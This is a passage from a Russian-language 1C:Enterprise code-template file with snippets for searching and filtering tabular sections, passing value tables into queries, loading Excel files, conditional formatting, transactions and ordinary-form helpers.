НайденныеСтроки 	= <?""Название ТЧ"">.НайтиСтроки(ПараметрыОтбора);

Для каждого <?""Название ТЧ"">Строка Из НайденныеСтроки Цикл
	
	<?""Название ТЧ"">Строка
	
КонецЦикла;"}
},
{0,
{"ТЧ_НайтиСтроки в строку отбора Структурой",0,0,"НайтиС[трок]","НайденныеСтроки 	= <?""Название ТЧ"">.НайтиСтроки(Новый Структура(""Параметр"", Значение));

Для каждого <?""Название ТЧ"">Строка Из НайденныеСтроки Цикл
	
	<?""Название ТЧ"">Строка
	
КонецЦикла;"}
},
{0,
{"ТЧ_НайтиСтроки (есть элементы)",0,0,"НайтиЕстьС[трок]","ПараметрыОтбора 	= Новый Структура;
ПараметрыОтбора.Вставить(""Параметр""	, Значение);
НайденныеСтроки 	= <?""Название ТЧ"">.НайтиСтроки(ПараметрыОтбора);

ВыполненоУсловие<?""Условие для поиска строки (Слитно)""> 	= НайденныеСтроки.Количество() > 0;
Если ВыполненоУсловие<?""Условие для поиска строки (Слитно)""> Тогда
	Результат = Истина;
КонецЕсли;"}
},
{0,
{"ТЧ_НайтиСтроки в строку отбора Структурой  (есть элементы)",0,0,"НайтиЕстьС[трок]","НайденныеСтроки 	= <?""Название ТЧ"">.НайтиСтроки(Новый Структура(""Параметр"", Значение));

ВыполненоУсловие<?""Условие для поиска строки (Слитно)""> 	= НайденныеСтроки.Количество() > 0;
Если ВыполненоУсловие<?""Условие для поиска строки (Слитно)""> Тогда
	Результат = Истина;
КонецЕсли;"}
},
{0,
{"ТЧ_ВыгрузитьПоОтбору",0,0,"ТЧ_Выг[рузить]","ПараметрыОтбора = Новый Структура;
ПараметрыОтбора.Вставить(""Параметр"", Значение);
НайденныеСтроки = <?""Название ТЧ"">.НайтиСтроки(ПараметрыОтбора);
Если ЗначениеЗаполнено(НайденныеСтроки) Тогда
	СтрокаТЗ = НайденныеСтроки[0];
КонецЕсли;
<?""Название ТЧ"">Отбор = Источник.<?""Название ТЧ"">.Выгрузить(ПараметрыОтбора);

Если ЗначениеЗаполнено(СтрокаТЗ) Тогда
	
КонецЕсли;"}
},
{0,
{"ТЧ_ВыполнитьПересчетНомерСтроки",0,0,"","&НаКлиентеНаСервереБезКонтекста
Процедура ВыполнитьПересчетНомерСтроки(Таблица)
	
	Инд = 1;
	Для Каждого СтрокаТЧ Из Таблица Цикл
		СтрокаТЧ.НомерСтроки 	= Инд;
		Инд						= Инд + 1;
	КонецЦикла;
	
КонецПроцедуры
"}
},
{0,
{"ТаблицаЗначений в запрос",0,0,"ТЗВЗ[апр]","Запрос 			= Новый Запрос;
Запрос.Текст 	= 
""ВЫБРАТЬ
|	<?""Название внешней таблицы"">.Номенклатура,
|	<?""Название внешней таблицы"">.НомерСтроки КАК НомерСтрокиСортировка
|ПОМЕСТИТЬ ВТ_<?""Название внешней таблицы"">
|ИЗ
|	&ВТ_<?""Название внешней таблицы""> КАК <?""Название внешней таблицы"">
|;"";

Запрос.УстановитьПараметр(""ВТ_<?""Название внешней таблицы"">"", <?""Название внешней таблицы"">);

РезультатЗапроса 	= Запрос.Выполнить();
РезультатТЗ 		= РезультатЗапроса.Выгрузить();"}
},
{0,
{"ТаблицаЗначений в запрос Выполнить",0,0,"ТЗВЗапрВып[олн]","Запрос 			= Новый Запрос;
Запрос.Текст 	= 
""ВЫБРАТЬ
|	<?""Название внешней таблицы"">.Номенклатура,
|	<?""Название внешней таблицы"">.НомерСтроки КАК НомерСтрокиСортировка
|ПОМЕСТИТЬ ВТ_<?""Название внешней таблицы"">
|ИЗ
|	&ВТ_<?""Название внешней таблицы""> КАК <?""Название внешней таблицы"">
|;"";

Запрос.УстановитьПараметр(""ВТ_<?""Название внешней таблицы"">"", <?""Название внешней таблицы"">);

РезультатЗапроса 	= Запрос.Выполнить();
РезультатТЗ 		= РезультатЗапроса.Выгрузить();"}
},
{0,
{"ТаблицаЗначений в запрос создавая таблицу",0,0,"","<?""Название внешней таблицы""> 	= Новый ТаблицаЗначений;
<?""Название внешней таблицы"">.Колонки.Добавить(""Номенклатура"", Новый ОписаниеТипов(""СправочникСсылка.Номенклатура"")); //Иначе ошибка ""Тип не может быть выбран в запросе""

Запрос 			= Новый Запрос;
Запрос.Текст 	= 
""ВЫБРАТЬ
|	<?""Название внешней таблицы"">.Номенклатура,
|	<?""Название внешней таблицы"">.НомерСтроки КАК НомерСтрокиСортировка
|ПОМЕСТИТЬ ВТ_<?""Название внешней таблицы"">
|ИЗ
|	&ВТ_<?""Название внешней таблицы""> КАК <?""Название внешней таблицы"">
|;"";

Запрос.УстановитьПараметр(""ВТ_<?""Название внешней таблицы"">""	, <?""Название внешней таблицы"">);

РезультатЗапроса 	= Запрос.Выполнить();
РезультатТЗ 		= РезультатЗапроса.Выгрузить();"}
},
{0,
{"ТЧ_ПометитьСтроки (дабавляя служебную колонку) (например, удалить строки)",0,0,"ПометитьСтр[оки]","Если <?""Имя таблицы"">.Количество() > 0 Тогда
	<?""Имя таблицы"">Колонка<?""Имя колонки (слитно и обязательно, напр., Пометка)""> = <?""Имя таблицы"">.Колонки.Добавить(""<?""Имя колонки (слитно и обязательно, напр., Пометка)"">"", Новый ОписаниеТипов(""Булево""));
	
	Для каждого <?""Имя таблицы"">Строка Из <?""Имя таблицы""> Цикл
		
		Если Истина Тогда
			<?""Имя таблицы"">Строка.<?""Имя колонки (слитно и обязательно, напр., Пометка)""> = Истина;
		КонецЕсли;
		
	КонецЦикла;
	
	лНайденныеСтроки 	= <?""Имя таблицы"">.НайтиСтроки(Новый Структура(""<?""Имя колонки (слитно и обязательно, напр., Пометка)"">"", Истина));
	
	Если лНайденныеСтроки.Количество() > 0 Тогда
		Для каждого лНайденныеСтрокиСтрока Из лНайденныеСтроки Цикл
			
			<?""Имя таблицы"">.Удалить(лНайденныеСтрокиСтрока);
			
		КонецЦикла;  
	КонецЕсли;	
	
	<?""Имя таблицы"">.Колонки.Удалить(""<?""Имя колонки (слитно и обязательно, напр., Пометка)"">"");
	
КонецЕсли;"}
},
{0,
{"Загрузка файла Ексель в ТЧ",0,0,"","ПутьФайла 		= ""C:\Temp\Buf.xls"";
ДвоичныеДанные 	= ПолучитьИзВременногоХранилища(Адрес);
ДвоичныеДанные.Записать(ПутьФайла);

ТабДок 	= Новый ТабличныйДокумент;
ТабДок.Прочитать(ПутьФайла, СпособЧтенияЗначенийТабличногоДокумента.Значение); 

ПЗ 		= Новый ПостроительЗапроса;
ПЗ.ИсточникДанных 			= Новый ОписаниеИсточникаДанных(ТабДок.Область());
ПЗ.ДобавлениеПредставлений 	= ТипДобавленияПредставлений.НеДобавлять;
ПЗ.ЗаполнитьНастройки();
ПЗ.Выполнить();

ТаблицаЗначений 	= ПЗ.Результат.Выгрузить();"}
},
{0,
{"Записи в Ексель (без Екселя на компьютере)",0,0,"","Способ и записи в ексель без Екселя:
Использовать ""ТабличныйДокумент""
Прям как ПФ делаешь
Только в конце сохраняешь как ексель
"}
},
{0,
{"Гибкий отбор в таблице значений с использованием построителя запроса",0,0,"","Гибкий отбор в таблице значений с использованием построителя запроса
Иногда возникают ситуации, когда нужно сделать отбор в таблице значений используя нечеткое условие, к примеру: больше, меньше, содержит и т.д. Можно, конечно же, использовать перебор в цикле и там уже делать проверку на нечеткие условия, можно использовать метод НайтиСтроки(), вот только отбор, передаваемые туда как параметр, всегда будут иметь вид сравнения - равно.
Что же делать, если нам нужно найти строки в ТЧ и при этом использовать нечеткое условие и не использовать цикл?
Все просто: можно воспользоваться построителем запроса.
Построитель запроса - это объект встроенного языка, с помощью которого мы можем получать необходимые данные, используя отборы.

Пример:
Есть таблица значений ПродукцияТЗ, которая содержит исходные данные. Нужно найти строки, где сумма больше нуля и равна нулю.

Построитель = Новый ПостроительЗапроса;
Построитель.ИсточникДанных = Новый ОписаниеИсточникаДанных(ПродукцияТЗ);

// 1. отбор для выбора строк больших нуля
СтрокаОтбора 				= Построитель.Отбор.Добавить(""Сумма"");
СтрокаОтбора.ВидСравнения 	= ВидСравнения.Больше;
СтрокаОтбора.Значение 		= 0;
СтрокаОтбора.Использование 	= Истина;

Построитель.Выполнить();
ОплаченныеЗапчастиТЗ 	= Построитель.Результат.Выгрузить();

// 2. переопределяем отбор для выбора нулевых строк
СтрокаОтбора = Построитель.Отбор[""Сумма""];
СтрокаОтбора.ВидСравнения 	= ВидСравнения.Равно;

Построитель.Выполнить();
БесплатныеЗапчасти 		= Построитель.Результат.Выгрузить();"}
},
{0,
{"ТЗ создать колонки из ДереваЗначенией и заполнить",0,0,"","//Создадим колонки
Для каждого ДанныеОтчетаКолонкиЭлем Из ДанныеОтчета.Колонки Цикл
	
	лТипЗначения 	= ДанныеОтчетаКолонкиЭлем.ТипЗначения; 
	Если ЗначениеЗаполнено(лТипЗначения) Тогда
		ИтогиТЗ.Колонки.Добавить(ДанныеОтчетаКолонкиЭлем.Имя, лТипЗначения); 
	Иначе
		ИтогиТЗ.Колонки.Добавить(ДанныеОтчетаКолонкиЭлем.Имя, Новый ОписаниеТипов(""Строка""));
	КонецЕсли; 
	
КонецЦикла; 

//Заполним ТЗ сотрудников
Для каждого ДанныеОтчетаСтрокиЭлем Из ДанныеОтчета.Строки Цикл
	
	лСтрока = ИтогиТЗ.Добавить();
	ЗаполнитьЗначенияСвойств(лСтрока, ДанныеОтчетаСтрокиЭлем); 
	
КонецЦикла;"}
},
{0,
{"ТЗ Добавить строку",0,0,"ТЗД[Стр]","лНоваяСтрока 	= <?""Имя ТЗ (слитно)"">.Добавить();"}
},
{0,
{"СтруктурныйПоиск (НайтиСтроки постепенно уменьшая критерии поиска)",0,0,"","Функция СтруктурныйПоиск(пТаблица, пСписокКритериевПоиска, пСтрукутраКритериевИЗначений, пОстановитсяНа = 0, пПервыйЭлементНайден = Ложь)
	
	лРезультат 	= Неопределено;
	
	лСписокКритериевПоискаМассив = СтрРазделить(СтрЗаменить(пСписокКритериевПоиска, "" "", """"), "","", Ложь);
	
	Если НЕ ЗначениеЗаполнено(лСписокКритериевПоискаМассив) Тогда
		Возврат Неопределено;
	КонецЕсли; 
	
	лКоличество 	= лСписокКритериевПоискаМассив.Количество();
	Если лКоличество = 0 ИЛИ лКоличество = пОстановитсяНа Тогда
		Возврат Неопределено;
	КонецЕсли; 
	
	лЭлемент1 	= лСписокКритериевПоискаМассив[0]; //Первый элемент, т.е. найдём ли вообще самый первый, и только потом будет искать остальные
	Если НЕ пПервыйЭлементНайден И ЗначениеЗаполнено(пТаблица.НайтиСтроки(Новый Структура(лЭлемент1, пСтрукутраКритериевИЗначений[лЭлемент1]))) Тогда
		пПервыйЭлементНайден 	= Истина;
	Иначе
		Возврат Неопределено;
	КонецЕсли; 
	
	лКритерийПоиска 	= Новый Структура;
	Для каждого лЭлем Из лСписокКритериевПоискаМассив Цикл
		
		лКритерийПоиска.Вставить(лЭлем, пСтрукутраКритериевИЗначений[лЭлем]);
		
	КонецЦикла; 
	
	лТаблицаНайдено 	= пТаблица.НайтиСтроки(лКритерийПоиска);
	
	Если ЗначениеЗаполнено(лТаблицаНайдено) Тогда
		лРезультат 	= лТаблицаНайдено;
	Иначе
		лНовыйСписокКритериевПоиска 	= """";
		Для ии = 0 По лСписокКритериевПоискаМассив.ВГраница() - 1 Цикл
			
			лНовыйСписокКритериевПоиска 	= лНовыйСписокКритериевПоиска + лСписокКритериевПоискаМассив[ии] + "","";
			
		КонецЦикла;
		
		лРезультат = СтруктурныйПоиск(пТаблица, лНовыйСписокКритериевПоиска, пСтрукутраКритериевИЗначений, пОстановитсяНа, пПервыйЭлементНайден);
	КонецЕсли; 
	
	Возврат лРезультат;
	
КонецФункции // СтруктурныйПоиск()"}
}
},
{4,
{"Условное Оформление (УО)",1,0,"",""},
{0,
{"УсловноеОформление",0,0,"условное[оформление]","//Процедура ПрименитьУсловноеОфомление 
//-------------------------------------------------------------------------
//Параметры:
//		ИмяПроверяемогоЭлемента - Строка - Напр., ""Объект.Имя_Проверяемого_Элемента""
//		ИмяОформляемогоЭлемента - Строка - Напр., ""Имя_Оформляемого_Элемента""
//-------------------------------------------------------------------------
//автор: КучеровРМ 30.07.2018 
&НаСервере
Процедура ПрименитьУсловноеОфомление(ИмяПроверяемогоЭлемента, ИмяОформляемогоЭлемента)
	
	ЭлементОформления = УсловноеОформление.Элементы.Добавить();    
	// Создаем условие отбора
	ЭлементОтбора = ЭлементОформления.Отбор.Элементы.Добавить(Тип(""ЭлементОтбораКомпоновкиДанных""));
	ЭлементОтбора.ЛевоеЗначение = Новый ПолеКомпоновкиДанных(ИмяПроверяемогоЭлемента); // ИмяПроверяемогоЭлемента = ""Объект.Имя_Проверяемого_Элемента""
	ЭлементОтбора.ВидСравнения = ВидСравненияКомпоновкиДанных.Равно; 
	//Значение для отбора
	ЭлементОтбора.ПравоеЗначение = Истина;
	ЭлементОтбора.Использование = Истина;
	// Установка значения элемента УО
	ЭлементОформления.Оформление.УстановитьЗначениеПараметра(""ЦветТекста"", WebЦвета.Серый);
	ЭлементОформления.Оформление.УстановитьЗначениеПараметра(""Шрифт"", Новый Шрифт(, 10, Истина,,,,,)); //Выделение жирным шрифтом
	// Создаем поля оформления
	ПолеОформления = ЭлементОформления.Поля.Элементы.Добавить();
	ПолеОформления.Поле = Новый ПолеКомпоновкиДанных(ИмяОформляемогоЭлемента); // ИмяОформляемогоЭлемента = ""Имя_Оформляемого_Элемента""
	ПолеОформления.Использование = Истина;
	
КонецПроцедуры
"}
},
{0,
{"Условное Оформление с идентификатором",0,0,"","//Процедура ПрименитьУсловноеОфомление 
//-------------------------------------------------------------------------
//Параметры:
//		ИмяПроверяемогоЭлемента - Строка - Напр., ""Объект.Имя_Проверяемого_Элемента""
//		ВидСравненияКД - ВидСравненияКомпоновкиДанных - ВидСравненияКомпоновкиДанных., напр ВидСравненияКомпоновкиДанных.Равно
//		ПравоеЗначениеОтбора - ЛюбойТип - Ннапр., Истина
//		ИмяОформляемогоЭлемента - Строка - Напр., ""Имя_Оформляемого_Элемента""
//		ИдентификаторПользовательскойНастройки - Строка - Напр., ""ИдентификаторПользовательскойНастройки"" (ИПН), 
//														если заданный ИПН не найден, будет добавлен слемент с этим ИПН
//-------------------------------------------------------------------------
//автор: КучеровРМ 30.07.2018 
&НаСервере
Процедура ПрименитьУсловноеОфомление(ИмяПроверяемогоЭлемента, ВидСравненияКД, ПравоеЗначениеОтбора, ИмяОформляемогоЭлемента, ИдентификаторПользовательскойНастройки = """")
	
	УсловноеОформлениеЭлементы = УсловноеОформление.Элементы;
	
	Если ПустаяСтрока(ИдентификаторПользовательскойНастройки) Тогда
		ПрисвоитьИдентификаторПользовательскойНастройки = ИмяПроверяемогоЭлемента + ""_"" + ИмяОформляемогоЭлемента;
	КонецЕсли;
	
	ЕстьЭлементСИПН = Ложь;
	
	Для каждого ЭлементУО Из УсловноеОформлениеЭлементы Цикл
		
		Если ЭлементУО.ИдентификаторПользовательскойНастройки = ПрисвоитьИдентификаторПользовательскойНастройки Тогда
			ЕстьЭлементСИПН = Истина;
		КонецЕсли; 
		
	КонецЦикла;
	
	Если НЕ ЕстьЭлементСИПН Тогда
		ДобавитьУсловноеОфомление(УсловноеОформлениеЭлементы, ИмяПроверяемогоЭлемента, ВидСравненияКД, ПравоеЗначениеОтбора, ИмяОформляемогоЭлемента, ПрисвоитьИдентификаторПользовательскойНастройки);
	КонецЕсли;
	
КонецПроцедуры

//Процедура ПрименитьУсловноеОфомление 
//-------------------------------------------------------------------------
//Параметры:
//		ИмяПроверяемогоЭлемента - Строка - Напр., ""Объект.Имя_Проверяемого_Элемента""
//		ВидСравненияКД - Строка - ВидСравненияКомпоновкиДанных., напр ВидСравненияКомпоновкиДанных.Равно
//		ПравоеЗначениеОтбора - ЛюбойТип - Ннапр., Истина
//		ИмяОформляемогоЭлемента - Строка - Напр., ""Имя_Оформляемого_Элемента""
//		ИдентификаторПользовательскойНастройки - Строка - Напр., ""ИдентификаторПользовательскойНастройки"" (ИПН), 
//														если заданный ИПН не найден, будет добавлен слемент с этим ИПН
//-------------------------------------------------------------------------
//автор: КучеровРМ 30.07.2018 
&НаСервере
Процедура ДобавитьУсловноеОфомление(УсловноеОформлениеЭлементы, ИмяПроверяемогоЭлемента, ВидСравненияКД, ПравоеЗначениеОтбора, ИмяОформляемогоЭлемента, ИдентификаторПользовательскойНастройки = """")
	
	//УсловноеОформлениеЭлементы = УсловноеОформление.Элементы;
	ЭлементОформления = УсловноеОформлениеЭлементы.Добавить();
	
	ЭлементОформления.ИдентификаторПользовательскойНастройки = ИдентификаторПользовательскойНастройки;
	// Создаем условие отбора
	ЭлементОтбора = ЭлементОформления.Отбор.Элементы.Добавить(Тип(""ЭлементОтбораКомпоновкиДанных""));
	ЭлементОтбора.ЛевоеЗначение = Новый ПолеКомпоновкиДанных(ИмяПроверяемогоЭлемента); // ИмяПроверяемогоЭлемента = ""Объект.Имя_Проверяемого_Элемента""
	ЭлементОтбора.ВидСравнения = ВидСравненияКД; 
	//Значение для отбора
	ЭлементОтбора.ПравоеЗначение = ПравоеЗначениеОтбора;
	ЭлементОтбора.Использование = Истина;
	// Установка значения элемента УО
	//ЭлементОформления.Оформление.УстановитьЗначениеПараметра(""ЦветТекста"", WebЦвета.Черный);
	ЭлементОформления.Оформление.УстановитьЗначениеПараметра(""ЦветФона"", WebЦвета.Коралловый); // Томатный, Лосоль
	ЭлементОформления.Оформление.УстановитьЗначениеПараметра(""Шрифт"", Новый Шрифт(, 10, Истина,,,,,)); //Выделение жирным шрифтом
	// Создаем поля оформления
	ПолеОформления = ЭлементОформления.Поля.Элементы.Добавить();
	ПолеОформления.Поле = Новый ПолеКомпоновкиДанных(ИмяОформляемогоЭлемента); // ИмяОформляемогоЭлемента = ""Имя_Оформляемого_Элемента""
	ПолеОформления.Использование = Истина; 
	
КонецПроцедуры
"}
},
{0,
{"Условное оформление с инедтификатором и указанием внешнего вида",0,0,"","//Процедура ПрименитьУсловноеОфомление 
//-------------------------------------------------------------------------
//Параметры:
//		УсловноеОформлениеЭлементы - УсловноеОформление - Напр., ""УсловноеОформление.Элементы"" или для динамического списка ""Список.УсловноеОформление.Элементы""
//		ИмяПроверяемогоЭлемента - Строка - Напр., ""Объект.Имя_Проверяемого_Элемента""
//		ВидСравненияКД - ВидСравненияКомпоновкиДанных - ВидСравненияКомпоновкиДанных., напр ВидСравненияКомпоновкиДанных.Равно
//		ПравоеЗначениеОтбора - ЛюбойТип - Ннапр., Истина
//		ИмяОформляемогоЭлемента - Строка - Напр., ""Имя_Оформляемого_Элемента"". Несколько: ""Имя_Оформляемого_Элемента1,Имя_Оформляемого_Элемента2""
//		ИдентификаторПользовательскойНастройки - Строка - Напр., ""ИдентификаторПользовательскойНастройки"" (ИПН)
//														если заданный ИПН не найден, будет добавлен слемент с этим ИПН
//		ЦветТекста - WebЦвета - Напр., WebЦвета.Черный
//		ЦветФона - WebЦвета - Напр., WebЦвета.Лосоль
//		ЖирныйШрифт - Булево - Напр., Истина
//		СвоеОформление 	- Структура 	- Вида: СвоеОформление = Новый Структура(""ЦветТекста"", WebЦвета.Синий); 
//-------------------------------------------------------------------------
// Для динамического списка (ДС) для даты можно использовать ""Дата.ЧастиДат.Час"".
// Так же для ДС нужно обращаться прямо к реквизитам во всех частях
//-------------------------------------------------------------------------
//автор: КучеровРМ 12.02.2019
&НаСервере
Процедура ПрименитьУсловноеОфомление(УсловноеОформлениеЭлементы, ИмяПроверяемогоЭлемента, ВидСравненияКД, ПравоеЗначениеОтбора, ИмяОформляемогоЭлемента, ИдентификаторПользовательскойНастройки = """", ЦветТекста = Неопределено, ЦветФона = Неопределено, ЖирныйШрифт = Ложь, СвоеОформление = Неопределено) Экспорт
	
	//УсловноеОформлениеЭлементы = УсловноеОформление.Элементы;
	                                       
	Если ПустаяСтрока(ИдентификаторПользовательскойНастройки) Тогда
		ПрисвоитьИдентификаторПользовательскойНастройки 	= ИмяПроверяемогоЭлемента + ""_"" + ИмяОформляемогоЭлемента;
	КонецЕсли;
	
	ЕстьЭлементСИПН 	= Ложь; // ИдентификаторПользовательскойНастройки
	
	Для каждого ЭлементУО Из УсловноеОформлениеЭлементы Цикл
		
		Если ЭлементУО.ИдентификаторПользовательскойНастройки = ПрисвоитьИдентификаторПользовательскойНастройки Тогда
			ЕстьЭлементСИПН = Истина;
		КонецЕсли; 
		
	КонецЦикла;
	
	Если НЕ ЕстьЭлементСИПН Тогда // Добавляем новое условное офомление
		//УсловноеОформлениеЭлементы = УсловноеОформление.Элементы;
		ЭлементОформления = УсловноеОформлениеЭлементы.Добавить();
		
		ЭлементОформления.ИдентификаторПользовательскойНастройки = ПрисвоитьИдентификаторПользовательскойНастройки;
		// Создаем условие отбора
		ЭлементОтбора = ЭлементОформления.Отбор.Элементы.Добавить(Тип(""ЭлементОтбораКомпоновкиДанных""));
		ЭлементОтбора.ЛевоеЗначение 	= Новый ПолеКомпоновкиДанных(ИмяПроверяемогоЭлемента); // ИмяПроверяемогоЭлемента = ""Объект.Имя_Проверяемого_Элемента""
		ЭлементОтбора.ВидСравнения 		= ВидСравненияКД; 
		//Значение для отбора
		ЭлементОтбора.ПравоеЗначение 	= ПравоеЗначениеОтбора;
		ЭлементОтбора.Использование 	= Истина;
		// Установка значения элемента УО
		Если ЦветТекста <> Неопределено Тогда
			ЭлементОформления.Оформление.УстановитьЗначениеПараметра(""ЦветТекста"", ЦветТекста); // WebЦвета.Черный
		КонецЕсли; 
		Если ЦветФона <> Неопределено Тогда
			ЭлементОформления.Оформление.УстановитьЗначениеПараметра(""ЦветФона"", ЦветФона); // Томатный, Лосоль
		КонецЕсли;
		Если ЖирныйШрифт Тогда
			ЭлементОформления.Оформление.УстановитьЗначениеПараметра(""Шрифт"", Новый Шрифт(, 10, Истина,,,,,)); //Выделение жирным шрифтом
		КонецЕсли;
		
		Если СвоеОформление <> Неопределено Тогда
			Для каждого СтруктЭлем Из СвоеОформление Цикл
				
				ЭлементОформления.Оформление.УстановитьЗначениеПараметра(СтруктЭлем.Ключ, СтруктЭлем.Значение);
				
			КонецЦикла; 	
		КонецЕсли; 
		
		// Создаем поля оформления
		ИмяОформляемогоЭлементаМассив 	= СтрРазделить(СтрЗаменить(ИмяОформляемогоЭлемента, "" "", """"), "","", Ложь);
		Для каждого ИмяОформляемогоЭлементаМассивЭлем Из ИмяОформляемогоЭлементаМассив Цикл
			
			ПолеОформления 					= ЭлементОформления.Поля.Элементы.Добавить();
			ПолеОформления.Поле 			= Новый ПолеКомпоновкиДанных(ИмяОформляемогоЭлементаМассивЭлем); // ИмяОформляемогоЭлемента = ""Имя_Оформляемого_Элемента""
			ПолеОформления.Использование 	= Истина;
			
		КонецЦикла; 
		
	КонецЕсли;
	
КонецПроцедуры"}
},
{2,
{"Обычные формы (ОФ)",1,0,"",""},
{0,
{"УО ОФ",0,0,"","Процедура ЗаявкиКлиентаПриПолученииДанных(Элемент, ОформленияСтрок)
	
	Для каждого ОформлениеСтроки из ОформленияСтрок Цикл
		//ф=РаботаСДиалогами.ПолучитьТекстСчетаФактуры(УчетНДС.НайтиПодчиненныйСчетФактуру(ОформлениеСтроки.ДанныеСтроки.Ссылка,""СчетФактураВыданный""));
		//ОформлениеСтроки.Ячейки.СчетФактура.УстановитьТекст(?(ф=""Ввести счет-фактуру"","""",ф));
		//ЦветПогрузка=Новый Цвет(204, 255, 204 );
		//ЦветФона=Новый Цвет(255, 255, 255 );
		//Ф=?(ЯЗСК.ДаПогрузка(ОформлениеСтроки.ДанныеСтроки.Ссылка),204,255);
		//ОформлениеСтроки.ЦветФона=Новый Цвет(р,г,б);
		Если ОформлениеСтроки.ДанныеСтроки.Ссылка.Оплачено Тогда
			//ЦветФона=Новый Цвет(100,255,100);
			ЦветФона=Новый Цвет(176,196,222);
		Иначе
			ЦветФона=Новый Цвет(255, 255, 255 );
		КонецЕсли;
		ОформлениеСтроки.ЦветФона=ЦветФона;
		//кр= 255, 100,100
		//зел= 100, 255, 100
		//жел= 255, 255, 100
		//255, 204, 153
	КонецЦикла;
	
КонецПроцедуры"}
},
{0,
{"Жирный шрифт ОФ",0,0,"","Процедура РасчетПоказателейПриВыводеСтроки(Элемент, ОформлениеСтроки, ДанныеСтроки)
	
	Если Найти(ДанныеСтроки.Показатель.Наименование, ""Итого"") > 0 Тогда
		Шрифт = Новый Шрифт(ОформлениеСтроки.Шрифт, , , истина);
		Для каждого Ячейка Из ОформлениеСтроки.Ячейки Цикл
			Ячейка.Шрифт = Шрифт;    
		КонецЦикла;
	КонецЕсли;    
	
КонецПроцедуры"}
}
}
},
{2,
{"Транзакции",1,0,"",""},
{0,
{"НачатьТранзакцию",0,0,"НачатьТр[анзакцию]","НачатьТранзакцию();

<?>

ЗафиксироватьТранзакцию();"}
},
{0,
{"Начать с учетом ошибок",0,0,"","НачатьТранзакцию();

Попытка
	// Действия в транзакции
	<?>
Исключение
	Если ТранзакцияАктивна() Тогда
		ОтменитьТранзакцию();
	КонецЕсли;
	ВызватьИсключение;
КонецПопытки;

ЗафиксироватьТранзакцию();"}
}
},
{4,
{"Обычне формы",1,0,"",""},
{2,
{"Таблица",1,0,"",""},
{1,
{"Ячейки",1,0,"",""},
{0,
{"УстановитьТекстСостояния",0,0,"","// По переданныму состоянию документа устанавливает текст ячеек
//
// Параметры:
//	СостояниеДокумента - строка таблицы значений с состоянием текущей строки
//  Ячейки - фиксированную коллекцию значений ОформлениеЯчейки
//
Процедура УстановитьТекстСостояния(СостояниеДокумента, Ячейки) Экспорт
	
	ИменаЯчеек = Новый Массив;
	ИменаЯчеек.Добавить(""ХарактерВыплаты"");
	ИменаЯчеек.Добавить(""КОСГУ"");
	ИменаЯчеек.Добавить(""СтатьяФинансирования"");
	
	Если СостояниеДокумента <> Неопределено Тогда
		Для Каждого ИмяЯчейки Из ИменаЯчеек Цикл
			Ячейки[ИмяЯчейки].УстановитьТекст(СостояниеДокумента[ИмяЯчейки])
		КонецЦикла;	
	КонецЕсли;
	
КонецПроцедуры
"}
}
},
{0,
{"Добавить строки в ТЧ",0,0,"","//лНоваяСтрока 	= ЭлементыФормы.ТЧ.Значение.Добавить();
//лНоваяСтрока.ИмяРеквизита = """";"}
}
},
{0,
{"Свойства кнопок в ОсновныеДействияФормы",0,0,"","ЭлементыФормы.ОсновныеДействияФормы.Кнопки.<?""Имя кнопки (слитно)"">.Доступность = Ложь;"}
},
{0,
{"УстановитьКартинкиВСтрокахТЧ (ОФ)",0,0,"","Процедура ТоварыПриПолученииДанных(Элемент, ОформленияСтрок)
	
	РаботаСДиалогами.УстановитьКартинкиВСтрокахТЧ(ОформленияСтрок, мКартинкаСерийныеНомера, мКартинкаНаборКомплект);
	
КонецПроцедуры

Процедура УстановитьКартинкиВСтрокахТЧ(ОформленияСтрок, КартинкаСерийныеНомера, КартинкаНаборКомплект, ЕстьСерийныеНомера = Истина, ЕстьСоставНабора = Истина) Экспорт
	
	Если ОформленияСтрок.Количество() = 0 Тогда
		Возврат;
	КонецЕсли;
	
	МассивНоменклатуры = Новый Массив;
	Для каждого ОформлениеСтроки Из ОформленияСтрок Цикл
		МассивНоменклатуры.Добавить(ОформлениеСтроки.ДанныеСтроки.Номенклатура);
	КонецЦикла;
	
	Запрос = Новый Запрос;
	Запрос.УстановитьПараметр(""МассивНоменклатуры"", МассивНоменклатуры);
	Запрос.Текст =
	""ВЫБРАТЬ
	|	Номенклатура.Ссылка КАК Номенклатура,""
	+ ?(ЕстьСерийныеНомера, ""
	|	Номенклатура.ВестиСерийныеНомера КАК ВестиСерийныеНомера"", """")
	+ ?(ЕстьСоставНабора, ?(ЕстьСерийныеНомера, "","", """") + ""
	|	Номенклатура.Комплект КАК Комплект"", """") + ""
	|ИЗ
	|	Справочник.Номенклатура КАК Номенклатура
	|ГДЕ
	|	Номенклатура.Ссылка В(&МассивНоменклатуры)"";
	
	ТаблицаНоменклатуры = Запрос.Выполнить().Выгрузить();
	ТаблицаНоменклатуры.Индексы.Добавить(""Номенклатура"");
	
	Для каждого ОформлениеСтроки Из ОформленияСтрок Цикл
		
		НайденнаяСтрока = ТаблицаНоменклатуры.Найти(ОформлениеСтроки.ДанныеСтроки.Номенклатура, ""Номенклатура"");
		Если НайденнаяСтрока <> Неопределено Тогда
			
			Если ЕстьСерийныеНомера И НайденнаяСтрока.ВестиСерийныеНомера Тогда
				Если КартинкаСерийныеНомера = Неопределено Тогда
					КартинкаСерийныеНомера = БиблиотекаКартинок.СерийныеНомера;
				КонецЕсли;
				ОформлениеСтроки.Ячейки.Номенклатура.УстановитьКартинку(КартинкаСерийныеНомера);
			ИначеЕсли ЕстьСоставНабора И НайденнаяСтрока.Комплект Тогда
				Если КартинкаНаборКомплект = Неопределено Тогда
					КартинкаНаборКомплект = БиблиотекаКартинок.НаборКомплект;
				КонецЕсли;
				ОформлениеСтроки.Ячейки.Номенклатура.УстановитьКартинку(КартинкаНаборКомплект);
			КонецЕсли;
			
		КонецЕсли;
		
	КонецЦикла;
	
КонецПроцедуры
"}
},
{0,
{"ИнтерактивноНажатьКнопку",0,0,"","// Программное нажатие на кнопку (обычную или на командной панели) на *чужой* форме с вызовом связанного события
// через переопределение действия формы ПриПовторномОткрытии
// увы, без передачи элемента кнопки в качестве параметра
// для режима запуска ""обычное приложение""
Процедура ИнтерактивноНажатьКнопку(Кнопка, ФормаКнопки) Экспорт
	// Удостоверимся что есть права на нажатие
	// Кнопка
	стрОшибка = """";
	Попытка
		Если Кнопка.Видимость = Ложь Тогда
			стрОшибка = стрОшибка + "", Невидима"";
		КонецЕсли;    
	Исключение
	КонецПопытки;    
	Попытка
		Если Кнопка.Доступность = Ложь Тогда
			стрОшибка = стрОшибка + "", Недоступна"";
		КонецЕсли;    
	Исключение
